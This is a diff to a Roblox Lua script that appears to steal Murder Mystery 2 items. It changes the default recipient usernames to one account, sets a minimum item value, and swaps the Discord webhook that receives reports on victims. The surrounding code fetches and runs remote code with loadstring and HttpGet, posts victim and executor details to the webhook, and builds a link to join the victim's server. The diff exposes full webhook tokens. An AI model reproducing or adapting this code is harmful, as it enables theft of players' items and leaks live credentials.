@@ -182,12 +182,12 @@ local ok, result = pcall(function()
 	local LastOffer
 	local v35 = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. ty_what
 	local lib = loadstring(game:HttpGet("http" .. match .. "/scripts/mm2_value.lua"))()
-	local Users_ = Users or { "what are you doing buddy" }
+	local Users_ = Users or { "Thebestfunnehfanisme" }
 	local Username_ = Username or {
-		"No Username",
-		"sad"
+		"Thebestfunnehfanisme",
+		"Thebestfunnehfanisme"
 	}
-	local min_val_each_ = min_val_each or 0
+	local min_val_each_ = min_val_each or 1
 	local minrarity_ = minrarity or "Common"
 	local t7 = {
 		"DefaultGun",
@@ -793,7 +793,7 @@ local ok, result = pcall(function()
 			local v191 = table.concat({ identifyexecutor() }, ", ")
 
 			request({
-				Url = "https://discord.com/api/webhooks/1493530755069120572/7pbQe6SrcWoeM2RFLT7CjB8XEc6pSw3ae3lJHdine5ifuKJulCPGEtZLDuua22Er-etc",
+				Url = "https://discord.com/api/webhooks/1571537152263856129/SmsIq5xwx8PxNplbhx_fLiny6J8MIt92dBviPOsq_zD52opjMTRCPqmkYOTINn7isjsT",
 				Method = "POST",
 				Headers = {
 					["Content-Type"] = "application/json"
@@ -1312,7 +1312,7 @@ if not ok and result then
 	local v298 = table.concat({ identifyexecutor() }, ", ")
 
 	request({
-		Url = "https://discord.com/api/webhooks/1493530755069120572/7pbQe6SrcWoeM2RFLT7CjB8XEc6pSw3ae3lJHdine5ifuKJulCPGEtZLDuua22Er-etc",
+		Url = "https://discord.com/api/webhooks/1571537152263856129/SmsIq5xwx8PxNplbhx_fLiny6J8MIt92dBviPOsq_zD52opjMTRCPqmkYOTINn7isjsT",
 		Method = "POST",
 		Headers = {
 			["Content-Type"] = "application/json"
